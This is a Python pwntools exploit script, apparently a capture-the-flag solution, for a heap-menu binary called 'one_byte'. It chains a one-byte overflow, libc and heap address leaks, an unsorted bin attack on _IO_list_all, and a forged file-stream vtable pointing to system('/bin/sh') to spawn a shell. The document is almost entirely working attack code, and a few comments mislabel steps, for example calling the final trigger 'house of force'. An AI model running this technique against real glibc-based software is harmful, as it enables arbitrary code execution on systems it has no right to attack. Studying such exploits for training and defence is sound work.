#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./one_byte", checksec=True)
libc = elf.libc
#context.log_level = "debug"

gs = """continue"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
io.timeout = 1
global index
index = 0


def malloc():
    global index
    io.sendlineafter(b"> ", b"1")
    index += 1
    return index-1

def free(index):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"index: ", f"{index}".encode())

def edit(index, data):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"index: ", f"{index}".encode())
        io.sendlineafter(b"data: ", data)

def read(index):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", f"{index}".encode())
    return io.recvline().rstrip()

chunk_A = malloc()  # this will be our chunk that we leverage our single byte overflow to corrupt chunk B
chunk_B = malloc()  # we will later remainder chunk B with chunk C
chunk_C = malloc()  # our allocation for chunk C that'll get remaindered with chunk B  
chunk_D = malloc()  # our guard chunk for top chunk consolidation, if we dont allocate another chunk our other chunks get consolidated.
chunk_E = malloc()  # make room for file stream vtable pointer

# use the single byte overflow to change the size field of chunk B
edit(chunk_A, b"A"*88 + p8(0xc1))
    
# chunk B now has a 0xc0 size and was linked into the unsorted bin
free(chunk_B)

# remainder chunk B writing unsortedbin metadata into the remaindered chunk
chunk_B = malloc()

unsortedbin_addr = u64(read(chunk_C)[:8])
log.info(f"unsortedbin @ {unsortedbin_addr:#08x}")
unsortedbin_offset = libc.sym.main_arena + 88
log.info(f"unsortedbin offset: {unsortedbin_offset}")
libc.address = unsortedbin_addr - unsortedbin_offset  # we use the unsortedbin address since it's a part of libc minus its offset to rebase libc
log.info(f"LIBC base @ {libc.address:#08x}")


# request the remainder that overlaps chunk C
chunk_B2 = malloc()

# free chunk A then B2, writing fastbin metadata into chunk C we use this for our heap leak.
free(chunk_A)
free(chunk_B2)


heap = u64(read(chunk_C)[:8])
log.info(f"heap start address @ {heap:#08x}")

# return chunk B2 from the fastbins, followed by chunk A
# these two allocations will return the heap to its orignal state of having 5 0x60 sized chunks
chunk_B2 = malloc()
chunk_A = malloc()

# overflow from chunk A into chunk B's size field
edit(chunk_A, b"A"*88 + p8(0xc1))

# link chunk B into the unsortedbin
free(chunk_B)

# remainder chunk B
chunk_B = malloc()  # now an unsorted chunk overlaps chunk C, in preparation for an unsortedbin attack

# ============ prepare unsorted bin attack & fake file stream ===========

edit(chunk_B, p64(0)*10 + b"/bin/sh\0" + p8(0xb1))  # write /bin/sh into the file streams _flags field.

# overwrite the unsorted chunk's bk & ensure _IO_write_ptr > _IO_write_base.
# the _mode field is already null thanks to calloc
edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 16) + p64(1) + p64(2))  # replaces the bk with io_list_all-16, and io_write_ptr = 2 and io_write_ptr = 1 to pass the buffer flushing checks

# forge a vtable pointer and vtable, in this case the vtable overlaps the _unused2 field of the file stream to save space
edit(chunk_E, p64(libc.sym.system) + p64(heap + 0x178))

malloc()  # trigger house of force
io.interactive()
